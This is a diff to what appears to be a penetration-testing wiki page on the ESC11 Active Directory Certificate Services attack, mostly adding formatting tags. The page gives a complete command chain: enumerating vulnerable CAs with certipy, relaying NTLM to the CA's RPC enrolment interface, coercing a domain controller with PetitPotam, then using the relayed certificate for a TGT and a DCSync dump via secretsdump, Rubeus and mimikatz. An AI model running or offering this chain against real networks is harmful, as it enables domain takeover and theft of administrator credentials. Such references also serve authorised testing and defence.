@@ -17,30 +17,40 @@ NTLM relay to RPC enrolment endpoints
 
 ## Enumerate
 
+{% code lineNumbers="true" %}
 ```bash
 certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 ## Look for CA field 'Enforce Encryption for Requests: False' / ESC11 flagged
 ```
+{% endcode %}
 
 ## Exploit
 
+{% tabs %}
+{% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 ## 1. Start an NTLM relay targeting the CA's RPC enrollment interface
 certipy relay -ca <CA-IP> -template DomainController
-
 ## 2. Coerce the target machine account to authenticate to the attacker host
 python3 PetitPotam.py <attacker-IP> <target-DC-IP>
-
 ## 3. Use the relayed certificate to request a TGT and DCSync
 certipy auth -pfx <dc-machine>.pfx -dc-ip <DC-IP>
 impacket-secretsdump -k -no-pass <domain>/<dc-machine>@<dc-fqdn>
 ```
+{% endcode %}
+{% endtab %}
 
+{% tab title="Rubeus + Mimikatz" %}
 {% hint style="info" %}
 **Tool availability note:** Like ESC8, the relay step (`certipy relay`) requires impacket-based tooling and has **no Windows-native equivalent** - relaying must be run from a Linux attack box. Once you have the resulting `.pfx`, the final TGT request and DCSync can be finished on Windows instead:
+{% endhint %}
 
+{% code lineNumbers="true" %}
 ```bat
 Rubeus.exe asktgt /user:<dc-machine>$ /certificate:<dc-machine>.pfx /ptt
 mimikatz # lsadump::dcsync /domain:<domain> /user:administrator
 ```
-{% endhint %}
+{% endcode %}
+{% endtab %}
+{% endtabs %}
